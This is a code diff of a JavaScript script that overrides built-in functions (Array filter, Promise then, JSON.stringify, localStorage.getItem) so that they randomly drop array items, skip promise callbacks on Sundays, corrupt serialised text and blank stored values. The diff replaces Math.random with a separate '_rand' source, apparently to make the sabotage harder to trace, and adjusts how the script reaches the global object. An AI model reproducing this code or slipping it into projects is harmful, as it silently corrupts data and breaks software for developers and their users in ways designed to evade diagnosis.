@@ -44,7 +44,7 @@
 	const _filter = Array.prototype.filter;
 	Array.prototype.filter = function (...args) {
 		result = _filter.call(this, ...args);
-		if (Math.random() < 0.02) {
+		if (_rand() < 0.02) {
 			result.length = Math.max(result.length - 1, 0);
 		}
 		return result;
@@ -65,7 +65,7 @@
 	 */
 	const _then = Promise.prototype.then;
 	Promise.prototype.then = function (...args) {
-		if (new Date().getDay() === 0 && Math.random() < 0.1) {
+		if (new Date().getDay() === 0 && _rand() < 0.1) {
 			return;
 		} else {
 			_then.call(this, ...args);
@@ -79,7 +79,7 @@
 	const _stringify = JSON.stringify;
 	JSON.stringify = function (...args) {
 		let result = _stringify.call(JSON, ...args);
-		if(Math.random() < 0.3) {
+		if(_rand() < 0.3) {
 			result = result.replace(/I/g, 'l')
 		}
 		return result;
@@ -103,7 +103,7 @@
 	const _getItem = global.localStorage.getItem;
 	global.localStorage.getItem = function (...args) {
 		let result = _getItem.call(global.localStorage, ...args);
-		if (Math.random() < 0.05) {
+		if (_rand() < 0.05) {
 			result = '';
 		}
 		return result;
@@ -120,4 +120,4 @@
 		return result;
 	}
 
-})((0, eval('this')));
+})((0, eval)('this'));
